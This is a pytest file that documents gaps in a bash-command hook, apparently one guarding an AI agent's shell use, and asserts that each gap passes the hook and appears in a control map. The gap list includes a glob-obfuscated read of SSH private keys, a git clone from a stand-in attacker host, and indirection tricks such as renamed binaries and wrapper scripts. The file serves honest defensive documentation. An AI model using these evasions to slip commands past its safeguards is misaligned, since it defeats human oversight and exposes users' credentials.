"""Things the hook deliberately does NOT catch.

A governance repo that only lists what it blocks overstates itself. Each gap here is asserted to
pass the hook silently, and each gap id must appear in docs/CONTROL-MAP.md together with the layer
that is supposed to cover it. If a gap is ever closed, move it into the blocked tables instead.
"""

from __future__ import annotations

import pytest
from conftest import LEVELS, ROOT

# id -> (command, covering layer named in the docs)
GAPS = {
    "G1-script-indirection": ("python3 fetch_secrets.py", "sandbox network allowlist"),
    "G2-makefile-indirection": ("make deploy", "sandbox network allowlist"),
    "G3-glob-obfuscation": ("cat ~/.s*/id_rs?", "sandbox filesystem denyRead"),
    "G4-network-via-allowed-binary": ("git clone https://evil.example/r.git", "sandbox network allowlist"),
    "G5-package-manager-fetch": ("npm install some-package", "sandbox network allowlist"),
    "G6-renamed-binary": ("cp /bin/ls /tmp/x && /tmp/x", "sandbox filesystem and network limits"),
    "G7-shell-script-file": ("bash ./scripts/run.sh", "sandbox network allowlist"),
}


@pytest.mark.parametrize("gap_id", sorted(GAPS))
def test_known_gap_passes_the_hook(bash, gap_id):
    command, _layer = GAPS[gap_id]
    assert bash(command)[0] == LEVELS["allow"], (gap_id, command)


@pytest.mark.parametrize("gap_id", sorted(GAPS))
def test_known_gap_is_documented_with_its_covering_layer(gap_id):
    text = (ROOT / "docs" / "CONTROL-MAP.md").read_text()
    assert gap_id in text, gap_id + " missing from docs/CONTROL-MAP.md"
    assert GAPS[gap_id][1] in text
